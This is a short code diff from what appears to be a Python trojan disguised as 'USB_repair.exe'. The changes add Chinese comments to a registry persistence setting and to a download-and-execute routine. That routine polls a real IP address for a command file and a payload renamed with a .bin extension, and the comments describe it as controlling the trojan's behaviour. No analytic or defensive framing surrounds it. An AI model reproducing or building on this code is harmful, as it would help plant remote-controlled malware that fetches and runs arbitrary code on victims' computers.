@@ -36,7 +36,7 @@ ids = ['c','d','e','f','g','h','i','j','k','l','m','n']
 dirs = 'c:/ttt/'
 fname = 'USB_repair.exe'
 name = 'USB_repair.exe'  # 注册表要添加的项值名称
-regpath = 'c:\\ttt\\USB_repair.exe'  # 注册表要添加的exe路径
+regpath = 'c:\\ttt\\USB_repair.exe'  # 注册表要添加的路径
 
 #download and execute
 def remotecommend():
@@ -46,8 +46,8 @@ def remotecommend():
     downloadflag =0
     exeflag = 0
 
-    commendurl = "http://139.199.220.37/commend.txt"
-    url = "http://139.199.220.37/job.bin"
+    commendurl = "http://139.199.220.37/commend.txt" # 通过命令文件控制木马的行为
+    url = "http://139.199.220.37/job.bin" # 将要远程执行的bat、exe文件修改后缀为.bin,部署在远程主机上
 
     while True:
         time.sleep(10)
